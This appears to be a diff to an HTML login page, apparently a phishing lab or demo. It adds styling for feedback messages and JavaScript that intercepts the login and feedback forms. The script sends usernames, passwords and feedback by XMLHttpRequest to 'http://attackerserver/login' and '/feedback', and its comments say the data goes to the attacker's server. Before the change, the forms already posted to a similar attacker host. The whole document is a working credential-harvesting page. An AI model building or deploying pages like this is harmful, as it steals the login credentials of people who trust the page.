@@ -97,32 +97,118 @@
         .feedback-section {
             margin-top: 20px;
         }
+
+        /* Feedback messages */
+        .feedback-message {
+            margin-top: 20px;
+            padding: 10px;
+            color: #fff;
+            border-radius: 4px;
+        }
+
+        .success {
+            background-color: #4CAF50;
+        }
+
+        .error {
+            background-color: #f44336;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>Login</h1>
-        <form method="post" action="http://miharadaattackervictimaaaaa/login">
+        <!-- Login Form -->
+        <form id="loginForm">
             <label for="username">Username:</label>
-            <input type="text" name="username" required placeholder="Enter your username">
+            <input type="text" name="username" id="loginUsername" required placeholder="Enter your username">
             
             <label for="password">Password:</label>
-            <input type="password" name="password" required placeholder="Enter your password">
+            <input type="password" name="password" id="loginPassword" required placeholder="Enter your password">
             
             <button type="submit">Login</button>
         </form>
-        
+
+        <!-- Feedback Section -->
         <div class="feedback-section">
             <h2>Send Feedback</h2>
-            <form method="post" action="http://miharadaattackervictimaaaaa/feedback">
+            <form id="feedbackForm">
                 <label for="feedback-username">Username (Optional):</label>
-                <input type="text" name="username" id="feedback-username" placeholder="Your name (optional)">
+                <input type="text" name="username" id="feedbackUsername" placeholder="Your name (optional)">
                 <br>
-                <textarea name="feedback" required placeholder="Enter your feedback..."></textarea>
+                <textarea name="feedback" id="feedbackMessage" required placeholder="Enter your feedback..."></textarea>
                 <br>
                 <button type="submit">Send Feedback</button>
             </form>
         </div>
+
+        <!-- Feedback Response Messages -->
+        <div id="loginMessage" class="feedback-message" style="display:none;"></div>
+        <div id="feedbackMessageResponse" class="feedback-message" style="display:none;"></div>
     </div>
+
+    <script>
+        // Function to send form data via AJAX
+        function sendFormData(url, formData, successMessageElement, errorMessageElement) {
+            const xhr = new XMLHttpRequest();
+            xhr.open("POST", url, true);
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+            // Set up the onload function to handle success
+            xhr.onload = function() {
+                if (xhr.status === 200) {
+                    successMessageElement.style.display = "block";
+                    successMessageElement.classList.add("success");
+                    successMessageElement.textContent = "Submission successful!";
+                } else {
+                    errorMessageElement.style.display = "block";
+                    errorMessageElement.classList.add("error");
+                    errorMessageElement.textContent = "There was an error. Please try again.";
+                }
+            };
+
+            // Handle network or other errors
+            xhr.onerror = function() {
+                errorMessageElement.style.display = "block";
+                errorMessageElement.classList.add("error");
+                errorMessageElement.textContent = "Network error. Please try again.";
+            };
+
+            // Send the data
+            xhr.send(formData);
+        }
+
+        // Handle login form submission
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const username = document.getElementById('loginUsername').value;
+            const password = document.getElementById('loginPassword').value;
+
+            const formData = `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
+
+            const successMessageElement = document.getElementById('loginMessage');
+            const errorMessageElement = document.getElementById('loginMessage');
+
+            // Send login data to the attacker's server
+            sendFormData('http://attackerserver/login', formData, successMessageElement, errorMessageElement);
+        });
+
+        // Handle feedback form submission
+        document.getElementById('feedbackForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const feedbackUsername = document.getElementById('feedbackUsername').value;
+            const feedbackMessage = document.getElementById('feedbackMessage').value;
+
+            const formData = `username=${encodeURIComponent(feedbackUsername)}&feedback=${encodeURIComponent(feedbackMessage)}`;
+
+            const successMessageElement = document.getElementById('feedbackMessageResponse');
+            const errorMessageElement = document.getElementById('feedbackMessageResponse');
+
+            // Send feedback data to the attacker's server
+            sendFormData('http://attackerserver/feedback', formData, successMessageElement, errorMessageElement);
+        });
+    </script>
 </body>
 </html>
